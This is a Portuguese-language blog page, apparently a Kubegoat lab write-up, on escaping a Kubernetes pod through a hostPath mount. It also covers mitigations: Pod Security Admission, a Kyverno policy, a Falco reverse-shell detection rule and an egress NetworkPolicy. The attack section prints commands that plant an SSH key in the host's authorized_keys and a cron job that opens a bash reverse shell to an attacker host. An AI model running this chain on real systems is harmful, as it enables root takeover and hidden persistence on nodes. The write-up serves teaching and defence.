@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head><script src="/hannya_tech/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=hannya_tech/livereload" data-no-instant defer></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Hannya Tech">
+  <title>Container Escape to the Host System :: Hannya Tech</title>
+  
+  
+  <link rel="stylesheet" href="/hannya_tech/css/hannya.css">
+  
+  
+  
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/hannya_tech/css/hannya.css">
+</head>
+<body class="">
+  <header>
+    
+
+<div class="hannya-container" style="display: flex; align-items: center; justify-content: space-between; padding: 1rem 1.25rem;">
+  <a href="http://localhost:1313/hannya_tech/" aria-label="Home" style="display: flex; align-items: center; gap: 0.75rem; text-decoration: none;">
+    <img src="/hannya_tech/logo.svg" alt="Hannya Tech" style="height: 40px; width: auto;"/>
+    <span style="font-weight: 800; font-size: 1.25rem; color: var(--text);">Hannya Tech</span>
+  </a>
+
+  <nav style="display: flex; align-items: center; gap: 0.5rem;">
+    
+      
+        <a class="btn ghost" href="/hannya_tech/pesquisa/" style="text-decoration: none;">Pesquisas</a>
+      
+        <a class="btn ghost" href="/hannya_tech/sobre/" style="text-decoration: none;">Sobre</a>
+      
+    
+
+    <label for="darkmode-toggle" class="btn ghost" style="cursor: pointer;" title="Alternar tema">
+      <input name="darkmode-toggle" id="darkmode-toggle" type="checkbox" style="position: absolute; opacity: 0; pointer-events: none;" aria-label="Alternar tema">
+      <span class="icon-sun" style="display: inline-flex;"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+  <circle cx="12" cy="12" r="4"></circle>
+  <path d="M12 2v2"></path>
+  <path d="M12 20v2"></path>
+  <path d="m4.93 4.93 1.41 1.41"></path>
+  <path d="m17.66 17.66 1.41 1.41"></path>
+  <path d="M2 12h2"></path>
+  <path d="M20 12h2"></path>
+  <path d="m6.34 17.66-1.41 1.41"></path>
+  <path d="m19.07 4.93-1.41 1.41"></path>
+</svg></span>
+      <span class="icon-moon" style="display: none;"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+  <path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"></path>
+  <path d="M19 3v4"></path>
+  <path d="M21 5h-4"></path>
+</svg></span>
+    </label>
+  </nav>
+</div>
+
+  </header>
+
+  <main>
+    
+  <div class="hannya-container" style="max-width: 1300px; padding-left: clamp(1rem, 4vw, 2.5rem); padding-right: clamp(1rem, 4vw, 2.5rem);">
+    
+    <nav style="margin-bottom: clamp(1.5rem, 3vh, 2rem);">
+      <a href="/hannya_tech/pesquisa/" style="color: var(--accent); text-decoration: none; font-weight: 600; display: inline-flex; align-items: center; gap: 0.5rem; transition: gap 0.2s ease;">
+        <span>←</span> Voltar para Pesquisas
+      </a>
+    </nav>
+
+    
+    
+    
+    
+    <div style="width: 100%; height: clamp(250px, 40vh, 400px); border-radius: clamp(12px, 2vw, 20px); overflow: hidden; margin-bottom: clamp(1.5rem, 3vh, 2rem); position: relative; box-shadow: 0 8px 32px rgba(15, 23, 42, 0.12);">
+      <img src="/hannya_tech/images/subpesquisa/kubegoat/container-escape.png" alt="Container Escape to the Host System" style="width: 100%; height: 100%; object-fit: cover;">
+      <div style="position: absolute; inset: 0; background: linear-gradient(180deg, transparent 50%, rgba(0,0,0,0.7)); display: flex; align-items: flex-end; padding: clamp(1.25rem, 3vw, 2rem);">
+        <div>
+          <h1 style="color: white; font-size: clamp(2rem, 4vw, 3rem); font-weight: 800; margin: 0; text-shadow: 0 2px 8px rgba(0,0,0,0.3);">Container Escape to the Host System</h1>
+        </div>
+      </div>
+    </div>
+    
+
+    
+    <div style="display: flex; flex-wrap: wrap; gap: clamp(0.75rem, 2vw, 1rem); align-items: center; justify-content: center; margin-bottom: clamp(2rem, 4vh, 3rem); padding: clamp(1rem, 2.5vw, 1.5rem); background: var(--card-bg); border: 1px solid var(--border); border-radius: clamp(12px, 2vw, 16px);">
+      
+      <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
+        <span class="chip">kubernetes</span><span class="chip">container-escape</span><span class="chip">privilege-escalation</span><span class="chip">persistence</span><span class="chip">reverse-shell</span><span class="chip">cronjob</span>
+      </div>
+      
+      
+      
+      <div style="display: flex; align-items: center; gap: 0.5rem; color: var(--muted);">
+        <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        <span>21/01/2026</span>
+      </div>
+      
+    </div>
+
+    
+    <article class="whitepaper-content" style="max-width: 1100px; margin: 0 auto; width: 100%;">
+      
+      
+      
+
+      
+      <section class="box" style="margin-bottom: clamp(2rem, 4vh, 3rem); padding: clamp(1.5rem, 3vw, 2rem);">
+        <h2 style="font-size: 1.75rem; margin-bottom: 1.5rem; display: flex; align-items: center; gap: 0.75rem; border-bottom: 2px solid var(--border); padding-bottom: 0.75rem;">
+          <span style="font-size: 1.5rem;">🎯</span>
+          Introdução
+        </h2>
+        <div class="content" style="line-height: 1.8;">
+          <h2 id="introdução">Introdução</h2>
+<p>Nesta subpesquisa, exploramos uma vulnerabilidade crítica de configuração em um pod Kubernetes que expõe um serviço de webshell. A falha reside na montagem privilegiada do sistema de arquivos do host dentro do container, permitindo que um atacante escape completamente do ambiente containerizado e obtenha acesso direto ao worker node do cluster.</p>
+<p>O cenário demonstra como uma má configuração aparentemente simples pode comprometer não apenas o container, mas todo o nó de infraestrutura, abrindo caminho para movimentação lateral e persistência no cluster.</p>
+<h2 id="objetivos">Objetivos</h2>
+<ol>
+<li>Identificar montagens de volumes suspeitas no container webshell.</li>
+<li>Explorar o acesso ao sistema de arquivos do host para obter informações críticas.</li>
+<li>Estabelecer acesso SSH persistente ao worker node.</li>
+<li>Implementar mecanismo de persistência através de cronjob com reverse shell.</li>
+<li>Validar a resiliência do mecanismo de persistência.</li>
+</ol>
+<h2 id="-metodologia-de-ataque-red-team">🛠 Metodologia de Ataque (Red Team)</h2>
+<p>A exploração seguiu a cadeia de ataque de <strong>Container Breakout</strong> através de volume mount privilegiado.</p>
+<h3 id="1-reconhecimento-inicial">1. Reconhecimento Inicial</h3>
+<p>O serviço webshell estava acessível via navegador, fornecendo uma interface de linha de comando diretamente no browser.</p>
+<img src="/hannya_tech/images/subpesquisa/kubegoat/container-escape-1.png" alt="Interface do webshell acessível via web" class="evidencia" />
+
+<p>A primeira ação foi enumerar as montagens de volumes disponíveis no container para identificar possíveis vetores de escape:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mount
+</span></span></code></pre></div><img src="/hannya_tech/images/subpesquisa/kubegoat/container-escape-2.png" alt="Comando mount revelando montagem do host" class="evidencia" />
+
+<p><strong>Descoberta Crítica:</strong> A saída revelou uma montagem extremamente perigosa:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>tmpfs on /host-system/var/lib/kubelet/pods
+</span></span></code></pre></div><p>Esta montagem indica que o sistema de arquivos do host está acessível através do diretório <code>/host-system</code>, uma configuração que viola completamente o isolamento de containers.</p>
+<h3 id="2-exploração-do-sistema-host">2. Exploração do Sistema Host</h3>
+<p>Com acesso ao sistema de arquivos do host, navegamos para o diretório raiz do sistema:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /host-system
+</span></span></code></pre></div><p>O objetivo era estabelecer acesso SSH persistente. Para isso, tentamos acessar o diretório <code>.ssh</code> e modificar o arquivo <code>authorized_keys</code>:</p>
+<img src="/hannya_tech/images/subpesquisa/kubegoat/container-escape-3.png" alt="Tentativa de edição do authorized_keys" class="evidencia" />
+
+<p><strong>Obstáculo:</strong> O container não possuía editores de texto (<code>vim</code> ou <code>nano</code>) instalados. Isso é uma boa prática de segurança (imagens mínimas), mas não impediu o ataque.</p>
+<p><strong>Solução:</strong> Utilizamos o comando <code>echo</code> para adicionar nossa chave SSH pública:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXFil boneka@boneka-cyberwi&#34;</span> &gt;&gt; authorized_keys
+</span></span></code></pre></div><h3 id="3-enumeração-de-rede-do-host">3. Enumeração de Rede do Host</h3>
+<p>Para estabelecer conexão SSH, precisávamos do endereço IP do worker node. Primeiro, identificamos o sistema operacional:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/os-release
+</span></span></code></pre></div><img src="/hannya_tech/images/subpesquisa/kubegoat/container-escape-4.png" alt="Identificação do OS - Ubuntu Server" class="evidencia" />
+
+<p><strong>Resultado:</strong> Ubuntu Server - sistema conhecido por armazenar configurações de rede no diretório <code>/etc/netplan</code>.</p>
+<p>Navegamos até o diretório de configuração de rede:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/netplan/*.yaml
+</span></span></code></pre></div><img src="/hannya_tech/images/subpesquisa/kubegoat/container-escape-5.png" alt="Extração do IP do host via netplan" class="evidencia" />
+
+<p><strong>IP do Host Identificado:</strong> Com o endereço IP em mãos, estávamos prontos para testar o acesso SSH.</p>
+<h3 id="4-estabelecimento-de-acesso-ssh">4. Estabelecimento de Acesso SSH</h3>
+<p>Da máquina atacante, testamos a conexão SSH utilizando a chave privada correspondente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i ~/.ssh/id_ed25519 root@&lt;HOST_IP&gt;
+</span></span></code></pre></div><img src="/hannya_tech/images/subpesquisa/kubegoat/container-escape-6.png" alt="Acesso SSH bem-sucedido ao host" class="evidencia" />
+
+<p><strong>Sucesso!</strong> Obtivemos acesso completo ao worker node do Kubernetes com privilégios de root.</p>
+<h3 id="5-implementação-de-persistência">5. Implementação de Persistência</h3>
+<p>Embora o acesso SSH seja efetivo, ele pode ser facilmente detectado e removido por um administrador que revise o arquivo <code>authorized_keys</code>. Para garantir persistência mais robusta, implementamos um mecanismo de reverse shell automático via cronjob.</p>
+<p><strong>Estratégia:</strong> Configurar um cronjob que executa a cada minuto, estabelecendo uma conexão reversa para a máquina atacante.</p>
+<p><strong>No host comprometido:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;* * * * * /bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/IP_ATTACKER_MACHINE/4444 0&gt;&amp;1&#39;&#34;</span> | crontab -
+</span></span></code></pre></div><p>Este comando cria uma entrada no crontab que:</p>
+<ul>
+<li>Executa a cada minuto (<code>* * * * *</code>)</li>
+<li>Abre uma shell bash interativa</li>
+<li>Redireciona stdin, stdout e stderr para um socket TCP conectado à máquina atacante</li>
+</ul>
+<p><strong>Na máquina atacante:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p>Configuramos um listener Netcat na porta 4444 para receber as conexões reversas.</p>
+<h3 id="6-validação-de-persistência">6. Validação de Persistência</h3>
+<p>Após aguardar 1 minuto, a conexão reversa foi estabelecida automaticamente:</p>
+<img src="/hannya_tech/images/subpesquisa/kubegoat/container-escape-7.png" alt="Primeira conexão de reverse shell via cronjob" class="evidencia" />
+
+<p><strong>Teste de Resiliência:</strong> Fechamos a conexão e aguardamos novamente. Em exatamente 1 minuto, uma nova sessão foi estabelecida automaticamente:</p>
+<img src="/hannya_tech/images/subpesquisa/kubegoat/container-escape-8.png" alt="Reconexão automática demonstrando persistência" class="evidencia" />
+
+<p><strong>Resultado:</strong> O mecanismo de persistência provou ser resiliente, reconectando automaticamente mesmo após perda de conexão.</p>
+<h2 id="-análise-de-impacto-e-mitigação-blue-team">🛡 Análise de Impacto e Mitigação (Blue Team)</h2>
+<p>Esta vulnerabilidade é classificada como <strong>Crítica</strong> com severidade máxima. O comprometimento não se limita ao container, mas estende-se ao nó inteiro do cluster Kubernetes, potencialmente afetando todos os pods em execução naquele worker.</p>
+<h3 id="impacto-da-exploração">Impacto da Exploração</h3>
+<ol>
+<li><strong>Escape Completo de Container:</strong> Acesso irrestrito ao sistema de arquivos do host.</li>
+<li><strong>Privilégios Elevados:</strong> Acesso root ao worker node.</li>
+<li><strong>Persistência Robusta:</strong> Mecanismo de reconexão automática dificulta a remoção.</li>
+<li><strong>Movimentação Lateral:</strong> Possibilidade de comprometer outros nós e recursos do cluster.</li>
+<li><strong>Exfiltração de Dados:</strong> Acesso a secrets, tokens e configurações de todos os pods no nó.</li>
+</ol>
+<h3 id="como-corrigir-remediação-imediata">Como Corrigir (Remediação Imediata)</h3>
+<ol>
+<li><strong>Remover Volume Mount Privilegiado:</strong> Revisar e eliminar a montagem do sistema de arquivos do host no manifesto do pod:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#75715e"># CONFIGURAÇÃO INSEGURA - REMOVER</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">volumeMounts</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">host-system</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/host-system</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">host-system</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">hostPath</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
+</span></span></code></pre></div><ol start="2">
+<li>
+<p><strong>Limpar Persistência:</strong></p>
+<ul>
+<li>Remover a chave SSH do <code>authorized_keys</code></li>
+<li>Limpar o crontab: <code>crontab -r</code></li>
+<li>Verificar processos suspeitos: <code>ps aux | grep bash</code></li>
+<li>Revisar logs do sistema: <code>/var/log/auth.log</code> e <code>/var/log/syslog</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Rotacionar Credenciais:</strong> Assumir que todos os secrets do nó foram comprometidos e rotacioná-los.</p>
+</li>
+</ol>
+<h3 id="como-prevenir-hardening-de-cluster">Como Prevenir (Hardening de Cluster)</h3>
+<h4 id="1-pod-security-standards">1. Pod Security Standards</h4>
+<p>Implemente <strong>Pod Security Admission</strong> no namespace para bloquear configurações perigosas:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Namespace</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">production</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">labels</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">pod-security.kubernetes.io/enforce</span>: <span style="color:#ae81ff">restricted</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">pod-security.kubernetes.io/audit</span>: <span style="color:#ae81ff">restricted</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">pod-security.kubernetes.io/warn</span>: <span style="color:#ae81ff">restricted</span>
+</span></span></code></pre></div><p>O nível <code>restricted</code> bloqueia automaticamente:</p>
+<ul>
+<li>Montagens de <code>hostPath</code></li>
+<li>Execução como root</li>
+<li>Capabilities privilegiadas</li>
+</ul>
+<h4 id="2-admission-controllers">2. Admission Controllers</h4>
+<p>Configure o <strong>PodSecurityPolicy</strong> (ou substituto OPA/Kyverno) para negar pods com:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#75715e"># Exemplo de política Kyverno</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">kyverno.io/v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">ClusterPolicy</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">restrict-host-path</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">validationFailureAction</span>: <span style="color:#ae81ff">enforce</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">rules</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">deny-host-path</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">match</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">resources</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">kinds</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#ae81ff">Pod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">validate</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">message</span>: <span style="color:#e6db74">&#34;HostPath volumes are forbidden&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">pattern</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">=(volumes)</span>:
+</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">X(hostPath)</span>: <span style="color:#e6db74">&#34;null&#34;</span>
+</span></span></code></pre></div><h4 id="3-runtime-security">3. Runtime Security</h4>
+<p>Implemente ferramentas de detecção de runtime como <strong>Falco</strong> para alertar sobre:</p>
+<ul>
+<li>Modificações em <code>/etc/crontab</code> ou <code>crontab -e</code></li>
+<li>Alterações em <code>~/.ssh/authorized_keys</code></li>
+<li>Conexões de rede de saída suspeitas</li>
+<li>Execução de shells interativas em containers</li>
+</ul>
+<p><strong>Exemplo de regra Falco:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span>- <span style="color:#f92672">rule</span>: <span style="color:#ae81ff">Detect Reverse Shell</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">desc</span>: <span style="color:#ae81ff">Detects reverse shell connections</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">condition</span>: &gt;<span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    spawned_process and
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    proc.name in (bash, sh) and
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    fd.name contains &#34;/dev/tcp/&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">output</span>: <span style="color:#e6db74">&#34;Reverse shell detected (user=%user.name command=%proc.cmdline)&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">priority</span>: <span style="color:#ae81ff">CRITICAL</span>
+</span></span></code></pre></div><h4 id="4-network-policies">4. Network Policies</h4>
+<p>Restrinja conexões de saída não autorizadas:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">networking.k8s.io/v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">NetworkPolicy</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">deny-egress</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">podSelector</span>: {}
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">policyTypes</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">Egress</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">egress</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">to</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">namespaceSelector</span>: {}
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">protocol</span>: <span style="color:#ae81ff">TCP</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">port</span>: <span style="color:#ae81ff">443</span>  <span style="color:#75715e"># Apenas HTTPS para APIs internas</span>
+</span></span></code></pre></div><h4 id="5-auditoria-e-monitoramento">5. Auditoria e Monitoramento</h4>
+<ul>
+<li><strong>Kubernetes Audit Logs:</strong> Habilite auditoria para rastrear criação de pods com configurações suspeitas</li>
+<li><strong>SIEM Integration:</strong> Envie logs para sistemas centralizados (Splunk, ELK, etc.)</li>
+<li><strong>Alertas Automatizados:</strong> Configure alertas para modificações em arquivos críticos do host</li>
+</ul>
+<h2 id="-conclusão">📊 Conclusão</h2>
+<p>Esta subpesquisa demonstrou a severidade de montar o sistema de arquivos do host dentro de um container. O que começou como acesso a um webshell simples escalou rapidamente para comprometimento total do worker node com persistência robusta.</p>
+<p>A cadeia de ataque foi facilitada por:</p>
+<ol>
+<li><strong>Configuração Insegura:</strong> Volume mount do host sem justificativa</li>
+<li><strong>Falta de Segmentação:</strong> Ausência de Pod Security Standards</li>
+<li><strong>Ausência de Monitoramento:</strong> Nenhum alerta para modificações críticas</li>
+</ol>
+<p>A defesa efetiva requer múltiplas camadas: políticas preventivas (PSA/PSP), detecção em runtime (Falco), segmentação de rede (NetworkPolicies) e monitoramento contínuo. Nenhum container deveria ter acesso ao sistema de arquivos do host, exceto em casos extremamente específicos e controlados.</p>
+<p><strong>Assinado:</strong> BITC (Boy in the Cluster)</p>
+
+        </div>
+      </section>
+
+      
+
+      
+      
+
+      
+      
+
+      
+      
+
+      
+      
+    </article>
+
+    
+    
+    <div style="margin-top: clamp(3rem, 5vh, 4rem); text-align: center; padding: clamp(1.5rem, 3vw, 2rem); background: linear-gradient(135deg, rgba(124, 58, 237, 0.05), rgba(167, 139, 250, 0.05)); border-radius: clamp(12px, 2vw, 16px);">
+      
+      
+      
+      <p style="color: var(--muted); margin-bottom: 1rem;">Este whitepaper faz parte de:</p>
+      <a href="/hannya_tech/pesquisa/kubegoat/" class="btn primary" style="text-decoration: none; font-size: 1.05rem;">
+        <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path d="M19 12H5M12 19l-7-7 7-7"/>
+        </svg>
+        Exploração e Mitigação de Vulnerabilidades em Kubernetes: Estudo com Kubegoat
+      </a>
+      
+    </div>
+    
+  </div>
+
+<style>
+.whitepaper-content h3 {
+  font-size: 1.4rem;
+  font-weight: 700;
+  margin-top: 2rem;
+  margin-bottom: 1rem;
+  color: var(--text);
+}
+
+.whitepaper-content h4 {
+  font-size: 1.2rem;
+  font-weight: 600;
+  margin-top: 1.5rem;
+  margin-bottom: 0.75rem;
+  color: var(--text);
+}
+
+.whitepaper-content p {
+  margin-bottom: 1.25rem;
+  line-height: 1.8;
+  max-width: 85ch;
+}
+
+.whitepaper-content ul,
+.whitepaper-content ol {
+  margin-left: 1.5rem;
+  margin-bottom: 1.25rem;
+  line-height: 1.8;
+}
+
+.whitepaper-content li {
+  margin-bottom: 0.5rem;
+}
+
+.whitepaper-content code {
+  background: rgba(124, 58, 237, 0.1);
+  padding: 0.2rem 0.5rem;
+  border-radius: 4px;
+  font-size: 0.9em;
+  font-family: 'Courier New', monospace;
+}
+
+.whitepaper-content pre {
+  background: var(--card-bg);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 1.5rem;
+  overflow-x: auto;
+  margin-bottom: 1.5rem;
+}
+
+.whitepaper-content blockquote {
+  border-left: 4px solid var(--accent);
+  padding-left: 1.5rem;
+  margin: 1.5rem 0;
+  font-style: italic;
+  color: var(--muted);
+}
+
+.whitepaper-content img {
+  max-width: 100%;
+  height: auto;
+  border-radius: 12px;
+  margin: 2rem 0;
+  box-shadow: 0 4px 16px rgba(15, 23, 42, 0.1);
+}
+
+.whitepaper-content img.evidencia {
+  margin-top: 1rem;
+  margin-bottom: 2rem;
+  border: 1px solid var(--border);
+  box-shadow: 0 2px 12px rgba(124, 58, 237, 0.08);
+  transition: transform 0.2s ease, box-shadow 0.2s ease;
+}
+
+.whitepaper-content img.evidencia:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 8px 24px rgba(124, 58, 237, 0.15);
+}
+
+.whitepaper-content table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 2rem 0;
+}
+
+.whitepaper-content th,
+.whitepaper-content td {
+  padding: 0.75rem;
+  border: 1px solid var(--border);
+  text-align: left;
+}
+
+.whitepaper-content th {
+  background: var(--card-bg);
+  font-weight: 700;
+}
+
+@media (max-width: 1200px) {
+  .whitepaper-content {
+    max-width: 100%;
+  }
+  
+  .whitepaper-content p {
+    max-width: 100%;
+  }
+}
+
+@media (max-width: 768px) {
+  .hannya-container {
+    padding-left: 1.25rem !important;
+    padding-right: 1.25rem !important;
+  }
+  
+  .whitepaper-content {
+    padding: 0;
+  }
+  
+  .box {
+    padding: 1.25rem !important;
+    border-radius: 12px !important;
+  }
+  
+  .whitepaper-content h2 {
+    font-size: 1.5rem !important;
+  }
+  
+  .whitepaper-content h3 {
+    font-size: 1.25rem !important;
+  }
+  
+  .whitepaper-content table {
+    font-size: 0.9rem;
+  }
+}
+
+@media (max-width: 480px) {
+  .hannya-container {
+    padding-left: 1rem !important;
+    padding-right: 1rem !important;
+  }
+  
+  .box {
+    padding: 1rem !important;
+  }
+  
+  .whitepaper-content h2 {
+    font-size: 1.35rem !important;
+  }
+  
+  .whitepaper-content h3 {
+    font-size: 1.15rem !important;
+  }
+  
+  .whitepaper-content h4 {
+    font-size: 1.05rem !important;
+  }
+  
+  .whitepaper-content table {
+    font-size: 0.85rem;
+    display: block;
+    overflow-x: auto;
+  }
+  
+  .whitepaper-content pre {
+    font-size: 0.85rem;
+    padding: 1rem !important;
+  }
+}
+</style>
+
+  </main>
+
+  <footer style="text-align: center; padding: 2rem 1rem; color: var(--muted); border-top: 1px solid var(--border); margin-top: 4rem;">
+    <div class="hannya-container">
+      <p>&copy; 2026 Hannya Tech. Feito com <a href="https://gohugo.io/" target="_blank" rel="noopener" style="color: var(--accent);">Hugo</a>.</p>
+    </div>
+  </footer>
+
+  
+  <script>
+    const toggle = document.getElementById('darkmode-toggle');
+    const html = document.documentElement;
+    
+    
+    const currentTheme = localStorage.getItem('theme') || 'light';
+    if (currentTheme === 'dark') {
+      html.classList.add('dark');
+      if (toggle) toggle.checked = true;
+    }
+    
+    if (toggle) {
+      toggle.addEventListener('change', function() {
+        if (this.checked) {
+          html.classList.add('dark');
+          localStorage.setItem('theme', 'dark');
+        } else {
+          html.classList.remove('dark');
+          localStorage.setItem('theme', 'light');
+        }
+      });
+    }
+  </script>
+</body>
+</html>
